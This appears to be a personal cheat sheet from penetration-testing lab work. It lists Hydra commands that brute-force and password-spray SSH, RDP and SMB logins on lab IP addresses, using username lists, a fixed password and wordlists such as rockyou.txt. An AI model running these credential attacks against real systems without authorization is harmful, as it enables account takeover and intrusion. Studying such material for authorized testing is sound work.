## Hydra
```sh
sudo apt-get install hydra
```

```sh
echo "root" > user.txt
echo "optimus" >> user.txt
echo "albert" >> user.txt
echo "andreas" >> user.txt
echo "christine" >> user.txt
echo "maria" >> user.txt

hydra -L user.txt -p 'funnel123#!#' 10.129.228.195 ssh
```

## Login Brute Forcing SSH
```sh
hydra -l sam -P mut_password.list ssh://10.129.31.10
hydra -L user.list -P password.list ssh://10.129.42.197
```

## Login Brute Forcing Rdp
```sh
hydra -L user.list -P password.list rdp://10.129.42.19
```

## Login Brute Forcing SMB
```sh
hydra -L user.list -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt smb://10.129.42.197
hydra -l sam -P mut_password.list smb://10.129.31.10
```

## examples
```shell 
hydra -L user.list -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt smb://10.129.42.197
```
